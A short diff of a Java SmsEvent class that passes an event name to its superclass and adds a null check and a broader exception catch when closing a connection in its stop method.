@@ -56,7 +56,7 @@ public final class SmsEvent extends Event implements MessageListener {
      *            the conf params
      */
     public SmsEvent(final int actionId, final byte[] confParams) {
-        super(Event.EVENT_SMS, actionId, confParams);
+        super(Event.EVENT_SMS, actionId, confParams, "SmsEvent");
 
     }
 
@@ -124,10 +124,16 @@ public final class SmsEvent extends Event implements MessageListener {
     public synchronized void actualStop() {
 
         try {
-            dc.close(); // Close the connection so the thread returns.
+            if(dc!=null){
+                dc.close(); // Close the connection so the thread returns.
+            }
         } catch (final IOException e) {
             //#ifdef DEBUG
             debug.error(e.toString());
+            //#endif
+        }catch(Exception ex){
+            //#ifdef DEBUG_ERROR
+            debug.error(ex);
             //#endif
         }
     }
